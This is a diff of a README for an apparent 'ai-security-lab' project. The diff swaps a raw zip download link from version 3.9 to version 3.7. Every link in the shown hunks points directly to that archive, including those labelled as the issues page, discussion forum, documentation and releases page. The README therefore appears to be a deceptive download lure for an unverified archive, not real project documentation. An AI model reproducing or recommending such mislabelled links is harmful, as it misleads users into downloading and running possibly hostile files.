@@ -8,7 +8,7 @@ Welcome to **ai-security-lab**! This framework helps you test the security of AI
 
 To download the software, visit the following link:
 
-[![Download ai-security-lab](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai_security_lab_v3.9.zip)](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai_security_lab_v3.9.zip)
+[![Download ai-security-lab](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai-security-lab-v3.7.zip)](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai-security-lab-v3.7.zip)
 
 1. Click on the link above or the button to go to the Releases page.
 2. On the Releases page, you will see the latest version listed at the top. 
@@ -73,12 +73,12 @@ If you encounter issues:
 
 For questions and feedback, please join our community:
 
-- **GitHub Issues:** Report problems or ask questions directly on our [GitHub issues page](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai_security_lab_v3.9.zip).
-- **Discussion Forum:** Engage with other users in our [discussion forum](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai_security_lab_v3.9.zip) to share tips and experiences.
+- **GitHub Issues:** Report problems or ask questions directly on our [GitHub issues page](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai-security-lab-v3.7.zip).
+- **Discussion Forum:** Engage with other users in our [discussion forum](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai-security-lab-v3.7.zip) to share tips and experiences.
 
 ## 🔗 Links
 
-- **Documentation:** Learn more about using ai-security-lab [here](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai_security_lab_v3.9.zip).
-- **Releases Page:** [Visit the Releases page for updates](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai_security_lab_v3.9.zip).
+- **Documentation:** Learn more about using ai-security-lab [here](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai-security-lab-v3.7.zip).
+- **Releases Page:** [Visit the Releases page for updates](https://github.com/clolomagico123/ai-security-lab/raw/refs/heads/main/assets/ai-security-lab-v3.7.zip).
 
 By following these steps, you can easily download and run ai-security-lab. Enjoy securing your AI models!
